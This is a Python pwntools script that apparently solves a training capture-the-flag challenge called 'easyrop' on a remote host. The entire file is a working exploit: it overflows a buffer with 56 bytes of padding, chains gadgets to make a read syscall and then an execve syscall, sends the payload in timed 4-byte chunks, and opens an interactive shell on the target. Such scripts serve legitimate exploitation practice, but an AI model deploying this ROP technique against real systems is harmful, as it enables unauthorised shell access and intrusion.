from pwn import *
import time

context.terminal = ['tmux','splitw','-h']
r = remote("training.jinblack.it", 2015)
#r = process("./easyrop")
#gdb.attach(r, """b *0x00400290
#""")

gadget = p64(0x4001c2)
param_rdi = p64(0x00)
param_rsi = p64(0x600370)
param_rdx = p64(0x07)
param_rax = p64(0x00)
syscall = p64(0x400144)
param_null = p64(0x600380)
param_rax2 = p64(0x3b)
syscall2 = p64(0x00400168)
payload = b"A" * 56 + gadget + param_rdi + param_rsi + param_rdx + param_rax + syscall + gadget + param_rsi + param_null + param_null + param_rax2 + syscall2 

i = 0
while(i < len(payload)):
    r.send(payload[i].to_bytes(1,'big') + payload[i+1].to_bytes(1,'big') + payload[i+2].to_bytes(1,'big') + payload[i+3].to_bytes(1,'big'))
    time.sleep(0.2)
    r.send(b"\x00\x00\x00\x00")
    time.sleep(0.2)
    i = i+4

r.send(b"\x00\x00\x00\x00")
time.sleep(0.2)
r.send(b"\x00\x00\x00\x00")

r.interactive()
